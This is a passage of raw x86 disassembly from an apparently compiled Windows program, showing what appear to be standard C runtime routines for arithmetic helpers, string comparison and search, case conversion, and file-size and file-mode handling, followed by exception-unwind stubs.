  43774d:	mov    BYTE PTR [ebp-0x1],al
  437750:	and    BYTE PTR [ebp-0x1],0x48
  437754:	mov    BYTE PTR [esi+ecx*1+0x4],al
  437758:	jne    0x437786
  43775a:	test   al,al
  43775c:	jns    0x437786
  43775e:	test   BYTE PTR [ebp+0x14],0x2
  437762:	je     0x437786
  437764:	push   0x2
  437766:	push   0xffffffff
  437768:	push   edi
  437769:	call   0x4328fd
  43776e:	add    esp,0xc
  437771:	cmp    eax,0xffffffff
  437774:	mov    DWORD PTR [ebp-0x10],eax
  437777:	jne    0x4377a2
  437779:	call   0x432881
  43777e:	cmp    DWORD PTR [eax],0x83
  437784:	jne    0x4377e1
  437786:	cmp    BYTE PTR [ebp-0x1],0x0
  43778a:	jne    0x43779b
  43778c:	test   BYTE PTR [ebp+0x14],0x8
  437790:	je     0x43779b
  437792:	mov    eax,DWORD PTR [ebx]
  437794:	lea    eax,[esi+eax*1+0x4]
  437798:	or     BYTE PTR [eax],0x20
  43779b:	mov    eax,edi
  43779d:	pop    edi
  43779e:	pop    esi
  43779f:	pop    ebx
  4377a0:	leave  
  4377a1:	ret    
  4377a2:	push   0x1
  4377a4:	lea    eax,[ebp-0x2]
  4377a7:	push   eax
  4377a8:	push   edi
  4377a9:	mov    BYTE PTR [ebp-0x2],0x0
  4377ad:	call   0x436a37
  4377b2:	add    esp,0xc
  4377b5:	test   eax,eax
  4377b7:	jne    0x4377cf
  4377b9:	cmp    BYTE PTR [ebp-0x2],0x1a
  4377bd:	jne    0x4377cf
  4377bf:	push   DWORD PTR [ebp-0x10]
  4377c2:	push   edi
  4377c3:	call   0x437cc5
  4377c8:	cmp    eax,0xffffffff
  4377cb:	pop    ecx
  4377cc:	pop    ecx
  4377cd:	je     0x4377e1
  4377cf:	push   0x0
  4377d1:	push   0x0
  4377d3:	push   edi
  4377d4:	call   0x4328fd
  4377d9:	add    esp,0xc
  4377dc:	cmp    eax,0xffffffff
  4377df:	jne    0x437786
  4377e1:	push   edi
  4377e2:	call   0x432c08
  4377e7:	pop    ecx
  4377e8:	jmp    0x43762c
  4377ed:	push   0x14
  4377ef:	push   0x43b490
  4377f4:	call   0x431210
  4377f9:	and    DWORD PTR [ebp-0x1c],0x0
  4377fd:	and    DWORD PTR [ebp-0x4],0x0
  437801:	push   DWORD PTR [ebp+0x14]
  437804:	push   DWORD PTR [ebp+0xc]
  437807:	push   DWORD PTR [ebp+0x8]
  43780a:	lea    eax,[ebp-0x20]
  43780d:	push   eax
  43780e:	lea    eax,[ebp-0x1c]
  437811:	push   eax
  437812:	mov    ecx,DWORD PTR [ebp+0x10]
  437815:	call   0x437506
  43781a:	add    esp,0x14
  43781d:	mov    DWORD PTR [ebp-0x24],eax
  437820:	or     DWORD PTR [ebp-0x4],0xffffffff
  437824:	call   0x437832
  437829:	mov    eax,DWORD PTR [ebp-0x24]
  43782c:	call   0x43124b
  437831:	ret    
  437832:	cmp    DWORD PTR [ebp-0x1c],0x0
  437836:	je     0x437841
  437838:	push   DWORD PTR [ebp-0x20]
  43783b:	call   0x436899
  437840:	pop    ecx
  437841:	ret    
  437842:	push   0x18
  437844:	push   0x43b4a0
  437849:	call   0x431210
  43784e:	xor    edi,edi
  437850:	xor    ebx,ebx
  437852:	inc    ebx
  437853:	cmp    DWORD PTR ds:0x43ffdc,edi
  437859:	jne    0x437886
  43785b:	push   edi
  43785c:	push   edi
  43785d:	push   ebx
  43785e:	push   edi
  43785f:	call   DWORD PTR ds:0x43915c
  437865:	test   eax,eax
  437867:	je     0x437871
  437869:	mov    DWORD PTR ds:0x43ffdc,ebx
  43786f:	jmp    0x437886
  437871:	call   DWORD PTR ds:0x4390ac
  437877:	cmp    eax,0x78
  43787a:	jne    0x437886
  43787c:	mov    DWORD PTR ds:0x43ffdc,0x2
  437886:	mov    eax,ds:0x43ffdc
  43788b:	cmp    eax,ebx
  43788d:	jne    0x4378a6
  43788f:	push   DWORD PTR [ebp+0x14]
  437892:	push   DWORD PTR [ebp+0x10]
  437895:	push   DWORD PTR [ebp+0xc]
  437898:	push   DWORD PTR [ebp+0x8]
  43789b:	call   DWORD PTR ds:0x43915c
  4378a1:	jmp    0x437969
  4378a6:	cmp    eax,0x2
  4378a9:	je     0x4378af
  4378ab:	cmp    eax,edi
  4378ad:	jne    0x4378d7
  4378af:	mov    DWORD PTR [ebp-0x1c],edi
  4378b2:	mov    DWORD PTR [ebp-0x24],edi
  4378b5:	cmp    DWORD PTR [ebp+0x18],edi
  4378b8:	jne    0x4378c2
  4378ba:	mov    eax,ds:0x43fe64
  4378bf:	mov    DWORD PTR [ebp+0x18],eax
  4378c2:	push   edi
  4378c3:	push   edi
  4378c4:	push   DWORD PTR [ebp+0xc]
  4378c7:	push   DWORD PTR [ebp+0x8]
  4378ca:	call   DWORD PTR ds:0x439124
  4378d0:	mov    DWORD PTR [ebp-0x20],eax
  4378d3:	cmp    eax,edi
  4378d5:	jne    0x4378de
  4378d7:	xor    eax,eax
  4378d9:	jmp    0x437969
  4378de:	mov    DWORD PTR [ebp-0x4],edi
  4378e1:	add    eax,0x3
  4378e4:	and    eax,0xfffffffc
  4378e7:	call   0x433bb0
  4378ec:	mov    DWORD PTR [ebp-0x18],esp
  4378ef:	mov    esi,esp
  4378f1:	mov    DWORD PTR [ebp-0x28],esi
  4378f4:	or     DWORD PTR [ebp-0x4],0xffffffff
  4378f8:	jmp    0x437911
  4378fa:	xor    eax,eax
  4378fc:	inc    eax
  4378fd:	ret    
  4378fe:	mov    esp,DWORD PTR [ebp-0x18]
  437901:	call   0x435e66
  437906:	xor    edi,edi
  437908:	xor    esi,esi
  43790a:	or     DWORD PTR [ebp-0x4],0xffffffff
  43790e:	xor    ebx,ebx
  437910:	inc    ebx
  437911:	cmp    esi,edi
  437913:	jne    0x437927
  437915:	push   DWORD PTR [ebp-0x20]
  437918:	call   0x4311fe
  43791d:	pop    ecx
  43791e:	mov    esi,eax
  437920:	cmp    esi,edi
  437922:	je     0x4378d7
  437924:	mov    DWORD PTR [ebp-0x24],ebx
  437927:	push   DWORD PTR [ebp-0x20]
  43792a:	push   esi
  43792b:	push   DWORD PTR [ebp+0xc]
  43792e:	push   DWORD PTR [ebp+0x8]
  437931:	call   DWORD PTR ds:0x439124
  437937:	test   eax,eax
  437939:	je     0x43795a
  43793b:	cmp    DWORD PTR [ebp+0x14],edi
  43793e:	jne    0x437944
  437940:	push   edi
  437941:	push   edi
  437942:	jmp    0x43794a
  437944:	push   DWORD PTR [ebp+0x14]
  437947:	push   DWORD PTR [ebp+0x10]
  43794a:	push   0xffffffff
  43794c:	push   esi
  43794d:	push   ebx
  43794e:	push   DWORD PTR [ebp+0x18]
  437951:	call   DWORD PTR ds:0x4390a8
  437957:	mov    DWORD PTR [ebp-0x1c],eax
  43795a:	cmp    DWORD PTR [ebp-0x24],edi
  43795d:	je     0x437966
  43795f:	push   esi
  437960:	call   0x42e0ed
  437965:	pop    ecx
  437966:	mov    eax,DWORD PTR [ebp-0x1c]
  437969:	lea    esp,[ebp-0x34]
  43796c:	call   0x43124b
  437971:	ret    
  437972:	push   0x18
  437974:	push   0x43b4b0
  437979:	call   0x431210
  43797e:	xor    esi,esi
  437980:	cmp    DWORD PTR ds:0x43ffe0,esi
  437986:	jne    0x4379b6
  437988:	push   esi
  437989:	push   esi
  43798a:	xor    edi,edi
  43798c:	inc    edi
  43798d:	push   edi
  43798e:	push   esi
  43798f:	call   DWORD PTR ds:0x43915c
  437995:	test   eax,eax
  437997:	je     0x4379a1
  437999:	mov    DWORD PTR ds:0x43ffe0,edi
  43799f:	jmp    0x4379b6
  4379a1:	call   DWORD PTR ds:0x4390ac
  4379a7:	cmp    eax,0x78
  4379aa:	jne    0x4379b6
  4379ac:	mov    DWORD PTR ds:0x43ffe0,0x2
  4379b6:	mov    eax,ds:0x43ffe0
  4379bb:	cmp    eax,0x2
  4379be:	je     0x437a97
  4379c4:	cmp    eax,esi
  4379c6:	je     0x437a97
  4379cc:	cmp    eax,0x1
  4379cf:	jne    0x4379fb
  4379d1:	mov    DWORD PTR [ebp-0x1c],esi
  4379d4:	mov    DWORD PTR [ebp-0x20],esi
  4379d7:	cmp    DWORD PTR [ebp+0x18],esi
  4379da:	jne    0x4379e4
  4379dc:	mov    eax,ds:0x43fe64
  4379e1:	mov    DWORD PTR [ebp+0x18],eax
  4379e4:	push   esi
  4379e5:	push   esi
  4379e6:	push   DWORD PTR [ebp+0xc]
  4379e9:	push   DWORD PTR [ebp+0x8]
  4379ec:	call   DWORD PTR ds:0x43915c
  4379f2:	mov    ebx,eax
  4379f4:	mov    DWORD PTR [ebp-0x24],ebx
  4379f7:	cmp    ebx,esi
  4379f9:	jne    0x437a02
  4379fb:	xor    eax,eax
  4379fd:	jmp    0x437aa9
  437a02:	mov    DWORD PTR [ebp-0x4],esi
  437a05:	lea    eax,[ebx+ebx*1]
  437a08:	add    eax,0x3
  437a0b:	and    eax,0xfffffffc
  437a0e:	call   0x433bb0
  437a13:	mov    DWORD PTR [ebp-0x18],esp
  437a16:	mov    edi,esp
  437a18:	mov    DWORD PTR [ebp-0x28],edi
  437a1b:	or     DWORD PTR [ebp-0x4],0xffffffff
  437a1f:	jmp    0x437a38
  437a21:	xor    eax,eax
  437a23:	inc    eax
  437a24:	ret    
  437a25:	mov    esp,DWORD PTR [ebp-0x18]
  437a28:	call   0x435e66
  437a2d:	xor    esi,esi
  437a2f:	xor    edi,edi
  437a31:	or     DWORD PTR [ebp-0x4],0xffffffff
  437a35:	mov    ebx,DWORD PTR [ebp-0x24]
  437a38:	cmp    edi,esi
  437a3a:	jne    0x437a53
  437a3c:	lea    eax,[ebx+ebx*1]
  437a3f:	push   eax
  437a40:	call   0x4311fe
  437a45:	pop    ecx
  437a46:	mov    edi,eax
  437a48:	cmp    edi,esi
  437a4a:	je     0x4379fb
  437a4c:	mov    DWORD PTR [ebp-0x20],0x1
  437a53:	push   ebx
  437a54:	push   edi
  437a55:	push   DWORD PTR [ebp+0xc]
  437a58:	push   DWORD PTR [ebp+0x8]
  437a5b:	call   DWORD PTR ds:0x43915c
  437a61:	test   eax,eax
  437a63:	je     0x437a86
  437a65:	push   esi
  437a66:	push   esi
  437a67:	cmp    DWORD PTR [ebp+0x14],esi
  437a6a:	jne    0x437a70
  437a6c:	push   esi
  437a6d:	push   esi
  437a6e:	jmp    0x437a76
  437a70:	push   DWORD PTR [ebp+0x14]
  437a73:	push   DWORD PTR [ebp+0x10]
  437a76:	push   0xffffffff
  437a78:	push   edi
  437a79:	push   esi
  437a7a:	push   DWORD PTR [ebp+0x18]
  437a7d:	call   DWORD PTR ds:0x4390a4
  437a83:	mov    DWORD PTR [ebp-0x1c],eax
  437a86:	cmp    DWORD PTR [ebp-0x20],esi
  437a89:	je     0x437a92
  437a8b:	push   edi
  437a8c:	call   0x42e0ed
  437a91:	pop    ecx
  437a92:	mov    eax,DWORD PTR [ebp-0x1c]
  437a95:	jmp    0x437aa9
  437a97:	push   DWORD PTR [ebp+0x14]
  437a9a:	push   DWORD PTR [ebp+0x10]
  437a9d:	push   DWORD PTR [ebp+0xc]
  437aa0:	push   DWORD PTR [ebp+0x8]
  437aa3:	call   DWORD PTR ds:0x439124
  437aa9:	lea    esp,[ebp-0x34]
  437aac:	call   0x43124b
  437ab1:	ret    
  437ab2:	push   ebp
  437ab3:	mov    ebp,esp
  437ab5:	push   ecx
  437ab6:	push   ebx
  437ab7:	mov    ebx,DWORD PTR [ebp+0xc]
  437aba:	push   esi
  437abb:	mov    esi,DWORD PTR [ebp+0x8]
  437abe:	cmp    DWORD PTR [esi+0x14],0x0
  437ac2:	push   edi
  437ac3:	je     0x437b66
  437ac9:	cmp    DWORD PTR [esi+0x24],0x0
  437acd:	je     0x437ad8
  437acf:	cmp    ebx,0x7f
  437ad2:	jbe    0x437b66
  437ad8:	xor    edi,edi
  437ada:	inc    edi
  437adb:	cmp    ebx,0x100
  437ae1:	jae    0x437b02
  437ae3:	cmp    DWORD PTR [esi+0x28],edi
  437ae6:	jle    0x437af5
  437ae8:	push   edi
  437ae9:	push   ebx
  437aea:	push   esi
  437aeb:	call   0x435f49
  437af0:	add    esp,0xc
  437af3:	jmp    0x437afe
  437af5:	mov    eax,DWORD PTR [esi+0x48]
  437af8:	movzx  eax,BYTE PTR [eax+ebx*2]
  437afc:	and    eax,edi
  437afe:	test   eax,eax
  437b00:	je     0x437b73
  437b02:	mov    edx,DWORD PTR [esi+0x48]
  437b05:	mov    eax,ebx
  437b07:	sar    eax,0x8
  437b0a:	movzx  ecx,al
  437b0d:	test   BYTE PTR [edx+ecx*2+0x1],0x80
  437b12:	je     0x437b23
  437b14:	push   0x2
  437b16:	mov    BYTE PTR [ebp+0x8],al
  437b19:	mov    BYTE PTR [ebp+0x9],bl
  437b1c:	mov    BYTE PTR [ebp+0xa],0x0
  437b20:	pop    eax
  437b21:	jmp    0x437b2c
  437b23:	mov    BYTE PTR [ebp+0x8],bl
  437b26:	mov    BYTE PTR [ebp+0x9],0x0
  437b2a:	mov    eax,edi
  437b2c:	push   edi
  437b2d:	push   DWORD PTR [esi+0x4]
  437b30:	lea    ecx,[ebp-0x4]
  437b33:	push   0x3
  437b35:	push   ecx
  437b36:	push   eax
  437b37:	lea    eax,[ebp+0x8]
  437b3a:	push   eax
  437b3b:	push   0x100
  437b40:	push   DWORD PTR [esi+0x14]
  437b43:	call   0x430947
  437b48:	add    esp,0x20
  437b4b:	test   eax,eax
  437b4d:	je     0x437b73
  437b4f:	cmp    eax,edi
  437b51:	jne    0x437b59
  437b53:	movzx  eax,BYTE PTR [ebp-0x4]
  437b57:	jmp    0x437b75
  437b59:	movzx  ecx,BYTE PTR [ebp-0x3]
  437b5d:	xor    eax,eax
  437b5f:	mov    ah,BYTE PTR [ebp-0x4]
  437b62:	or     eax,ecx
  437b64:	jmp    0x437b75
  437b66:	cmp    ebx,0x41
  437b69:	jl     0x437b73
  437b6b:	cmp    ebx,0x5a
  437b6e:	lea    eax,[ebx+0x20]
  437b71:	jle    0x437b75
  437b73:	mov    eax,ebx
  437b75:	pop    edi
  437b76:	pop    esi
  437b77:	pop    ebx
  437b78:	leave  
  437b79:	ret    
  437b7a:	int3   
  437b7b:	int3   
  437b7c:	int3   
  437b7d:	int3   
  437b7e:	int3   
  437b7f:	int3   
  437b80:	mov    eax,DWORD PTR [esp+0x8]
  437b84:	mov    ecx,DWORD PTR [esp+0x10]
  437b88:	or     ecx,eax
  437b8a:	mov    ecx,DWORD PTR [esp+0xc]
  437b8e:	jne    0x437b99
  437b90:	mov    eax,DWORD PTR [esp+0x4]
  437b94:	mul    ecx
  437b96:	ret    0x10
  437b99:	push   ebx
  437b9a:	mul    ecx
  437b9c:	mov    ebx,eax
  437b9e:	mov    eax,DWORD PTR [esp+0x8]
  437ba2:	mul    DWORD PTR [esp+0x14]
  437ba6:	add    ebx,eax
  437ba8:	mov    eax,DWORD PTR [esp+0x8]
  437bac:	mul    ecx
  437bae:	add    edx,ebx
  437bb0:	pop    ebx
  437bb1:	ret    0x10
  437bb4:	int3   
  437bb5:	int3   
  437bb6:	int3   
  437bb7:	int3   
  437bb8:	int3   
  437bb9:	int3   
  437bba:	int3   
  437bbb:	int3   
  437bbc:	int3   
  437bbd:	int3   
  437bbe:	int3   
  437bbf:	int3   
  437bc0:	push   ebp
  437bc1:	mov    ebp,esp
  437bc3:	push   edi
  437bc4:	push   esi
  437bc5:	push   ebx
  437bc6:	mov    ecx,DWORD PTR [ebp+0x10]
  437bc9:	or     ecx,ecx
  437bcb:	je     0x437c1a
  437bcd:	mov    esi,DWORD PTR [ebp+0x8]
  437bd0:	mov    edi,DWORD PTR [ebp+0xc]
  437bd3:	mov    bh,0x41
  437bd5:	mov    bl,0x5a
  437bd7:	mov    dh,0x20
  437bd9:	lea    ecx,[ecx+0x0]
  437bdc:	mov    ah,BYTE PTR [esi]
  437bde:	or     ah,ah
  437be0:	mov    al,BYTE PTR [edi]
  437be2:	je     0x437c0b
  437be4:	or     al,al
  437be6:	je     0x437c0b
  437be8:	add    esi,0x1
  437beb:	add    edi,0x1
  437bee:	cmp    ah,bh
  437bf0:	jb     0x437bf8
  437bf2:	cmp    ah,bl
  437bf4:	ja     0x437bf8
  437bf6:	add    ah,dh
  437bf8:	cmp    al,bh
  437bfa:	jb     0x437c02
  437bfc:	cmp    al,bl
  437bfe:	ja     0x437c02
  437c00:	add    al,dh
  437c02:	cmp    ah,al
  437c04:	jne    0x437c11
  437c06:	sub    ecx,0x1
  437c09:	jne    0x437bdc
  437c0b:	xor    ecx,ecx
  437c0d:	cmp    ah,al
  437c0f:	je     0x437c1a
  437c11:	mov    ecx,0xffffffff
  437c16:	jb     0x437c1a
  437c18:	neg    ecx
  437c1a:	mov    eax,ecx
  437c1c:	pop    ebx
  437c1d:	pop    esi
  437c1e:	pop    edi
  437c1f:	leave  
  437c20:	ret    
  437c21:	int3   
  437c22:	int3   
  437c23:	int3   
  437c24:	int3   
  437c25:	int3   
  437c26:	int3   
  437c27:	int3   
  437c28:	int3   
  437c29:	int3   
  437c2a:	int3   
  437c2b:	int3   
  437c2c:	int3   
  437c2d:	int3   
  437c2e:	int3   
  437c2f:	int3   
  437c30:	push   esi
  437c31:	mov    eax,DWORD PTR [esp+0x14]
  437c35:	or     eax,eax
  437c37:	jne    0x437c61
  437c39:	mov    ecx,DWORD PTR [esp+0x10]
  437c3d:	mov    eax,DWORD PTR [esp+0xc]
  437c41:	xor    edx,edx
  437c43:	div    ecx
  437c45:	mov    ebx,eax
  437c47:	mov    eax,DWORD PTR [esp+0x8]
  437c4b:	div    ecx
  437c4d:	mov    esi,eax
  437c4f:	mov    eax,ebx
  437c51:	mul    DWORD PTR [esp+0x10]
  437c55:	mov    ecx,eax
  437c57:	mov    eax,esi
  437c59:	mul    DWORD PTR [esp+0x10]
  437c5d:	add    edx,ecx
  437c5f:	jmp    0x437ca8
  437c61:	mov    ecx,eax
  437c63:	mov    ebx,DWORD PTR [esp+0x10]
  437c67:	mov    edx,DWORD PTR [esp+0xc]
  437c6b:	mov    eax,DWORD PTR [esp+0x8]
  437c6f:	shr    ecx,1
  437c71:	rcr    ebx,1
  437c73:	shr    edx,1
  437c75:	rcr    eax,1
  437c77:	or     ecx,ecx
  437c79:	jne    0x437c6f
  437c7b:	div    ebx
  437c7d:	mov    esi,eax
  437c7f:	mul    DWORD PTR [esp+0x14]
  437c83:	mov    ecx,eax
  437c85:	mov    eax,DWORD PTR [esp+0x10]
  437c89:	mul    esi
  437c8b:	add    edx,ecx
  437c8d:	jb     0x437c9d
  437c8f:	cmp    edx,DWORD PTR [esp+0xc]
  437c93:	ja     0x437c9d
  437c95:	jb     0x437ca6
  437c97:	cmp    eax,DWORD PTR [esp+0x8]
  437c9b:	jbe    0x437ca6
  437c9d:	dec    esi
  437c9e:	sub    eax,DWORD PTR [esp+0x10]
  437ca2:	sbb    edx,DWORD PTR [esp+0x14]
  437ca6:	xor    ebx,ebx
  437ca8:	sub    eax,DWORD PTR [esp+0x8]
  437cac:	sbb    edx,DWORD PTR [esp+0xc]
  437cb0:	neg    edx
  437cb2:	neg    eax
  437cb4:	sbb    edx,0x0
  437cb7:	mov    ecx,edx
  437cb9:	mov    edx,ebx
  437cbb:	mov    ebx,ecx
  437cbd:	mov    ecx,eax
  437cbf:	mov    eax,esi
  437cc1:	pop    esi
  437cc2:	ret    0x10
  437cc5:	push   ebp
  437cc6:	mov    ebp,esp
  437cc8:	mov    eax,0x100c
  437ccd:	call   0x433bb0
  437cd2:	mov    eax,ds:0x43d404
  437cd7:	push   ebx
  437cd8:	push   esi
  437cd9:	push   0x1
  437cdb:	xor    esi,esi
  437cdd:	push   esi
  437cde:	push   DWORD PTR [ebp+0x8]
  437ce1:	mov    DWORD PTR [ebp-0x4],eax
  437ce4:	call   0x4328fd
  437ce9:	or     ebx,0xffffffff
  437cec:	add    esp,0xc
  437cef:	cmp    eax,ebx
  437cf1:	mov    DWORD PTR [ebp-0x1008],eax
  437cf7:	je     0x437df8
  437cfd:	push   0x2
  437cff:	push   esi
  437d00:	push   DWORD PTR [ebp+0x8]
  437d03:	call   0x4328fd
  437d08:	add    esp,0xc
  437d0b:	cmp    eax,ebx
  437d0d:	je     0x437df8
  437d13:	push   edi
  437d14:	mov    edi,DWORD PTR [ebp+0xc]
  437d17:	sub    edi,eax
  437d19:	test   edi,edi
  437d1b:	jle    0x437d98
  437d1d:	mov    ebx,0x1000
  437d22:	push   ebx
  437d23:	lea    eax,[ebp-0x1004]
  437d29:	push   esi
  437d2a:	push   eax
  437d2b:	call   0x42e4e0
  437d30:	push   0x8000
  437d35:	push   DWORD PTR [ebp+0x8]
  437d38:	call   0x437e06
  437d3d:	add    esp,0x14
  437d40:	mov    DWORD PTR [ebp-0x100c],eax
  437d46:	cmp    edi,ebx
  437d48:	mov    eax,ebx
  437d4a:	jge    0x437d4e
  437d4c:	mov    eax,edi
  437d4e:	push   eax
  437d4f:	lea    eax,[ebp-0x1004]
  437d55:	push   eax
  437d56:	push   DWORD PTR [ebp+0x8]
  437d59:	call   0x43225f
  437d5e:	add    esp,0xc
  437d61:	cmp    eax,0xffffffff
  437d64:	je     0x437d6e
  437d66:	sub    edi,eax
  437d68:	test   edi,edi
  437d6a:	jg     0x437d46
  437d6c:	jmp    0x437d86
  437d6e:	call   0x432881
  437d73:	cmp    DWORD PTR [eax],0x5
  437d76:	jne    0x437d83
  437d78:	call   0x432878
  437d7d:	mov    DWORD PTR [eax],0xd
  437d83:	or     esi,0xffffffff
  437d86:	push   DWORD PTR [ebp-0x100c]
  437d8c:	push   DWORD PTR [ebp+0x8]
  437d8f:	call   0x437e06
  437d94:	pop    ecx
  437d95:	pop    ecx
  437d96:	jmp    0x437de0
  437d98:	jge    0x437de0
  437d9a:	push   0x0
  437d9c:	push   DWORD PTR [ebp+0xc]
  437d9f:	push   DWORD PTR [ebp+0x8]
  437da2:	call   0x4328fd
  437da7:	push   DWORD PTR [ebp+0x8]
  437daa:	call   0x4367b8
  437daf:	add    esp,0x10
  437db2:	push   eax
  437db3:	call   DWORD PTR ds:0x439160
  437db9:	mov    esi,eax
  437dbb:	neg    esi
  437dbd:	sbb    esi,esi
  437dbf:	neg    esi
  437dc1:	dec    esi
  437dc2:	cmp    esi,ebx
  437dc4:	jne    0x437de0
  437dc6:	call   0x432878
  437dcb:	mov    DWORD PTR [eax],0xd
  437dd1:	call   0x432881
  437dd6:	mov    edi,eax
  437dd8:	call   DWORD PTR ds:0x4390ac
  437dde:	mov    DWORD PTR [edi],eax
  437de0:	push   0x0
  437de2:	push   DWORD PTR [ebp-0x1008]
  437de8:	push   DWORD PTR [ebp+0x8]
  437deb:	call   0x4328fd
  437df0:	add    esp,0xc
  437df3:	mov    eax,esi
  437df5:	pop    edi
  437df6:	jmp    0x437dfa
  437df8:	mov    eax,ebx
  437dfa:	mov    ecx,DWORD PTR [ebp-0x4]
  437dfd:	pop    esi
  437dfe:	pop    ebx
  437dff:	call   0x42f1f2
  437e04:	leave  
  437e05:	ret    
  437e06:	mov    eax,DWORD PTR [esp+0x4]
  437e0a:	mov    ecx,eax
  437e0c:	sar    ecx,0x5
  437e0f:	and    eax,0x1f
  437e12:	lea    edx,[ecx*4+0x465100]
  437e19:	lea    ecx,[eax+eax*8]
  437e1c:	mov    eax,DWORD PTR [edx]
  437e1e:	shl    ecx,0x2
  437e21:	movzx  eax,BYTE PTR [eax+ecx*1+0x4]
  437e26:	push   esi
  437e27:	mov    esi,0x8000
  437e2c:	and    eax,0x80
  437e31:	cmp    DWORD PTR [esp+0xc],esi
  437e35:	jne    0x437e42
  437e37:	mov    edx,DWORD PTR [edx]
  437e39:	lea    ecx,[edx+ecx*1+0x4]
  437e3d:	and    BYTE PTR [ecx],0x7f
  437e40:	jmp    0x437e55
  437e42:	cmp    DWORD PTR [esp+0xc],0x4000
  437e4a:	jne    0x437e62
  437e4c:	mov    edx,DWORD PTR [edx]
  437e4e:	lea    ecx,[edx+ecx*1+0x4]
  437e52:	or     BYTE PTR [ecx],0x80
  437e55:	neg    eax
  437e57:	sbb    eax,eax
  437e59:	and    eax,0xffffc000
  437e5e:	add    eax,esi
  437e60:	pop    esi
  437e61:	ret    
  437e62:	call   0x432878
  437e67:	mov    DWORD PTR [eax],0x16
  437e6d:	or     eax,0xffffffff
  437e70:	pop    esi
  437e71:	ret    
  437e72:	int3   
  437e73:	int3   
  437e74:	int3   
  437e75:	int3   
  437e76:	int3   
  437e77:	int3   
  437e78:	int3   
  437e79:	int3   
  437e7a:	int3   
  437e7b:	int3   
  437e7c:	int3   
  437e7d:	int3   
  437e7e:	int3   
  437e7f:	int3   
  437e80:	lea    eax,[edx-0x1]
  437e83:	pop    ebx
  437e84:	ret    
  437e85:	lea    esp,[esp+0x0]
  437e8c:	lea    esp,[esp+0x0]
  437e90:	xor    eax,eax
  437e92:	mov    al,BYTE PTR [esp+0x8]
  437e96:	push   ebx
  437e97:	mov    ebx,eax
  437e99:	shl    eax,0x8
  437e9c:	mov    edx,DWORD PTR [esp+0x8]
  437ea0:	test   edx,0x3
  437ea6:	je     0x437ebd
  437ea8:	mov    cl,BYTE PTR [edx]
  437eaa:	add    edx,0x1
  437ead:	cmp    cl,bl
  437eaf:	je     0x437e80
  437eb1:	test   cl,cl
  437eb3:	je     0x437f06
  437eb5:	test   edx,0x3
  437ebb:	jne    0x437ea8
  437ebd:	or     ebx,eax
  437ebf:	push   edi
  437ec0:	mov    eax,ebx
  437ec2:	shl    ebx,0x10
  437ec5:	push   esi
  437ec6:	or     ebx,eax
  437ec8:	mov    ecx,DWORD PTR [edx]
  437eca:	mov    edi,0x7efefeff
  437ecf:	mov    eax,ecx
  437ed1:	mov    esi,edi
  437ed3:	xor    ecx,ebx
  437ed5:	add    esi,eax
  437ed7:	add    edi,ecx
  437ed9:	xor    ecx,0xffffffff
  437edc:	xor    eax,0xffffffff
  437edf:	xor    ecx,edi
  437ee1:	xor    eax,esi
  437ee3:	add    edx,0x4
  437ee6:	and    ecx,0x81010100
  437eec:	jne    0x437f0a
  437eee:	and    eax,0x81010100
  437ef3:	je     0x437ec8
  437ef5:	and    eax,0x1010100
  437efa:	jne    0x437f04
  437efc:	and    esi,0x80000000
  437f02:	jne    0x437ec8
  437f04:	pop    esi
  437f05:	pop    edi
  437f06:	pop    ebx
  437f07:	xor    eax,eax
  437f09:	ret    
  437f0a:	mov    eax,DWORD PTR [edx-0x4]
  437f0d:	cmp    al,bl
  437f0f:	je     0x437f47
  437f11:	test   al,al
  437f13:	je     0x437f04
  437f15:	cmp    ah,bl
  437f17:	je     0x437f40
  437f19:	test   ah,ah
  437f1b:	je     0x437f04
  437f1d:	shr    eax,0x10
  437f20:	cmp    al,bl
  437f22:	je     0x437f39
  437f24:	test   al,al
  437f26:	je     0x437f04
  437f28:	cmp    ah,bl
  437f2a:	je     0x437f32
  437f2c:	test   ah,ah
  437f2e:	je     0x437f04
  437f30:	jmp    0x437ec8
  437f32:	pop    esi
  437f33:	pop    edi
  437f34:	lea    eax,[edx-0x1]
  437f37:	pop    ebx
  437f38:	ret    
  437f39:	lea    eax,[edx-0x2]
  437f3c:	pop    esi
  437f3d:	pop    edi
  437f3e:	pop    ebx
  437f3f:	ret    
  437f40:	lea    eax,[edx-0x3]
  437f43:	pop    esi
  437f44:	pop    edi
  437f45:	pop    ebx
  437f46:	ret    
  437f47:	lea    eax,[edx-0x4]
  437f4a:	pop    esi
  437f4b:	pop    edi
  437f4c:	pop    ebx
  437f4d:	ret    
  437f4e:	jmp    DWORD PTR ds:0x439094
  437f54:	lea    ecx,[ebp-0x50]
  437f57:	jmp    0x42aec1
  437f5c:	lea    ecx,[ebp-0x50]
  437f5f:	jmp    0x42aec1
  437f64:	lea    ecx,[ebp-0x94]
  437f6a:	jmp    0x42aec1
  437f6f:	mov    eax,0x43bca0
  437f74:	jmp    0x42ed26
  437f79:	mov    ecx,DWORD PTR [ebp-0x10]
  437f7c:	jmp    0x42e6b9
  437f81:	mov    eax,0x43bcc4
  437f86:	jmp    0x42ed26
  437f8b:	mov    eax,DWORD PTR [ebp-0x10]
  437f8e:	and    eax,0x1
  437f91:	je     0x437fa6
  437f97:	and    DWORD PTR [ebp-0x10],0xfffffffe
  437f9b:	mov    ecx,DWORD PTR [ebp-0x14]
  437f9e:	add    ecx,0x4
  437fa1:	jmp    0x42af00
  437fa6:	ret    
  437fa7:	mov    eax,0x43bce8
  437fac:	jmp    0x42ed26
  437fb1:	mov    ecx,DWORD PTR [ebp-0x14]
  437fb4:	jmp    0x401193
  437fb9:	mov    ecx,DWORD PTR [ebp-0x14]
  437fbc:	add    ecx,0x18
  437fbf:	jmp    0x42aec1
  437fc4:	lea    ecx,[ebp-0x10]
  437fc7:	jmp    0x42d334
  437fcc:	mov    eax,0x43bd1c
  437fd1:	jmp    0x42ed26
  437fd6:	mov    ecx,DWORD PTR [ebp-0x10]
  437fd9:	jmp    0x401193
  437fde:	mov    eax,0x43bd40
  437fe3:	jmp    0x42ed26
  437fe8:	mov    ecx,DWORD PTR [ebp-0x10]
  437feb:	jmp    0x42d334
  437ff0:	mov    ecx,DWORD PTR [ebp-0x10]
  437ff3:	add    ecx,0x4
  437ff6:	jmp    0x42aec1
  437ffb:	mov    ecx,DWORD PTR [ebp-0x10]
  437ffe:	add    ecx,0x20
  438001:	jmp    0x42aec1
  438006:	mov    ecx,DWORD PTR [ebp-0x10]
  438009:	add    ecx,0x3c
  43800c:	jmp    0x42aec1
  438011:	mov    ecx,DWORD PTR [ebp-0x10]
  438014:	add    ecx,0x58
  438017:	jmp    0x42aec1
  43801c:	mov    eax,0x43bd84
  438021:	jmp    0x42ed26
